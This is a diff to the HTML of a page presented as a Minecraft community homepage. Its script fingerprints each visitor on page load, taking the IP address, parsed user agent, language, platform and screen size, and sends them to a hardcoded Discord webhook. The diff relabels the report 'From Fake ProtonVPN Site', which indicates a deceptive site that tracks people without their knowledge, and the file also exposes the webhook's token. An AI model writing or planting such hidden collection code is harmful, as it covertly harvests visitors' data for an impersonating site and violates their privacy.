@@ -117,16 +117,27 @@
         <p>This is the main page for the Minecraft community. Click on the tabs above to learn more about us, join our Discord server, access the Minecraft server, or visit the shop.</p>
     </div>
     <script>
+    // Function to parse userAgent for improved clarity
+    function parseUserAgent(userAgent) {
+        const parser = /([\w\.\-]+)\/([\w\.]+)|([\w\-]+) \(([^)]+)\)/g;
+        let result = [];
+        let match;
+        while ((match = parser.exec(userAgent)) !== null) {
+            result.push(match[0]);
+        }
+        return result.join(', ') || userAgent;
+    }
+
     // Function to send the user data to the Discord webhook as an embed
     function sendUserDataToDiscord(userData) {
         const webhookURL = "https://discord.com/api/webhooks/1318017748856471552/VEFmQewEoHs-TgdRfnQ6nNJ7ErWM2HWLZV8sTKKAC3LE2wpaLaLDlgawHpeLC-_Mnczg"; // Replace with your Discord webhook URL
 
         const embed = {
-            title: "From Fake Site",
+            title: "From Fake ProtonVPN Site",
             color: 3447003, // Embed color in hexadecimal
             fields: [
                 { name: "User IP", value: userData.ip || "N/A", inline: false },
-                { name: "User Agent", value: userData.userAgent || "N/A", inline: false },
+                { name: "Parsed User Agent", value: userData.parsedUserAgent || "N/A", inline: false },
                 { name: "Browser Language", value: userData.browserLanguage || "N/A", inline: false },
                 { name: "Operating System", value: userData.osInfo || "N/A", inline: false },
                 { name: "Viewport Size", value: `${userData.viewportWidth} x ${userData.viewportHeight}`, inline: true },
@@ -160,7 +171,7 @@
     function collectUserData(ip) {
         return {
             ip: ip,
-            userAgent: navigator.userAgent || "N/A",
+            parsedUserAgent: parseUserAgent(navigator.userAgent) || "N/A",
             browserLanguage: navigator.language || "N/A",
             osInfo: navigator.platform || "N/A",
             viewportWidth: window.innerWidth || "N/A",
@@ -186,6 +197,7 @@
             sendUserDataToDiscord(userData);
         })
         .catch(error => console.error('Error fetching IP:', error));
-    </script>
+</script>
+
 </body>
 </html>
